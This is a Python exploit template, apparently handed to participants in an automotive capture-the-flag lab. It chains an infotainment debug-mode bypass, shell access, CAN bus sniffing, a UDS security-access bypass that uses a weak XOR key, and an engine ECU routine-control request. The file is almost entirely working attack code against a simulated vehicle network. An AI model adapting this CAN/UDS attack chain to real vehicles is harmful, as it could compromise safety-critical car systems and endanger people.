#!/usr/bin/env python3
"""
ECU 익스플로잇 템플릿
참가자들이 참고할 수 있는 기본 구조
"""
import socket
import struct
import can
import time

class ECUExploit:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.can_bus = None
    
    def connect(self):
        """인포테인먼트 ECU 연결"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            print(f"Connected to {self.host}:{self.port}")
            return True
        except Exception as e:
            print(f"Connection failed: {e}")
            return False
    
    def send_command(self, command):
        """명령 전송"""
        if self.sock:
            self.sock.send(command.encode() + b'\n')
            return self.sock.recv(1024).decode()
        return None
    
    def stage1_enable_debug(self):
        """1단계: 디버그 모드 활성화"""
        print("Stage 1: Enabling debug mode...")
        
        # 취약점을 이용한 디버그 모드 활성화
        response = self.send_command("3")  # Diagnostics 선택
        print(f"Menu response: {response}")
        
        # 디버그 모드 활성화 문자열 전송
        debug_string = "ENABLE_DEBUG_MODE_12345"
        response = self.send_command(debug_string)
        print(f"Debug activation: {response}")
        
        return "Debug mode enabled" in response
    
    def stage2_get_shell(self):
        """2단계: 쉘 획득"""
        print("Stage 2: Getting shell access...")
        
        # 디버그 메뉴 접근
        response = self.send_command("9")  # Debug menu
        print(f"Debug menu: {response}")
        
        # 쉘 명령 실행
        response = self.send_command("shell")
        print(f"Shell access: {response}")
        
        return True
    
    def stage3_can_access(self):
        """3단계: CAN 네트워크 접근"""
        print("Stage 3: Accessing CAN network...")
        
        try:
            # CAN 버스 연결 (Docker 환경에서)
            self.can_bus = can.interface.Bus(channel='vcan0', bustype='socketcan')
            print("CAN bus connected")
            
            # CAN 메시지 스니핑
            print("Listening for CAN messages...")
            for _ in range(10):
                msg = self.can_bus.recv(timeout=1)
                if msg:
                    print(f"CAN: {hex(msg.arbitration_id)} -> {msg.data.hex()}")
            
            return True
        except Exception as e:
            print(f"CAN access failed: {e}")
            return False
    
    def stage4_gateway_auth(self):
        """4단계: 게이트웨이 인증 우회"""
        print("Stage 4: Bypassing gateway authentication...")
        
        if not self.can_bus:
            print("CAN bus not available")
            return False
        
        try:
            # Security Access 요청 (Seed 요청)
            seed_req = can.Message(
                arbitration_id=0x123,
                data=[0x27, 0x01]  # Security Access, Request Seed
            )
            self.can_bus.send(seed_req)
            
            # 응답 수신
            response = self.can_bus.recv(timeout=2)
            if response and response.arbitration_id == 0x124:
                seed = struct.unpack('>H', response.data[2:4])[0]
                print(f"Received seed: {hex(seed)}")
                
                # 키 계산 (취약한 알고리즘)
                key = seed ^ 0x1337
                print(f"Calculated key: {hex(key)}")
                
                # 키 전송
                key_req = can.Message(
                    arbitration_id=0x123,
                    data=[0x27, 0x02] + list(struct.pack('>H', key))
                )
                self.can_bus.send(key_req)
                
                # 인증 결과 확인
                auth_response = self.can_bus.recv(timeout=2)
                if auth_response and auth_response.data[0] == 0x67:
                    print("Authentication successful!")
                    return True
            
        except Exception as e:
            print(f"Gateway authentication failed: {e}")
        
        return False
    
    def stage5_engine_access(self):
        """5단계: 엔진 ECU 접근"""
        print("Stage 5: Accessing engine ECU...")
        
        try:
            # Routine Control (엔진 ECU 활성화)
            routine_req = can.Message(
                arbitration_id=0x123,
                data=[0x31, 0x01, 0x12, 0x34]  # Routine Control, Start, Routine ID
            )
            self.can_bus.send(routine_req)
            
            # 응답 대기
            time.sleep(1)
            
            print("Engine ECU access initiated")
            print("Check engine ECU for final flag...")
            
            return True
            
        except Exception as e:
            print(f"Engine access failed: {e}")
            return False
    
    def run_exploit(self):
        """전체 익스플로잇 실행"""
        print("=== ECU Exploitation Started ===")
        
        if not self.connect():
            return False
        
        stages = [
            self.stage1_enable_debug,
            self.stage2_get_shell,
            self.stage3_can_access,
            self.stage4_gateway_auth,
            self.stage5_engine_access
        ]
        
        for i, stage in enumerate(stages, 1):
            if not stage():
                print(f"Stage {i} failed!")
                return False
            print(f"Stage {i} completed!\n")
        
        print("=== Exploitation Complete! ===")
        return True

def main():
    import sys
    
    if len(sys.argv) != 3:
        print("Usage: python exploit_template.py <host> <port>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    exploit = ECUExploit(host, port)
    exploit.run_exploit()

if __name__ == "__main__":
    main()
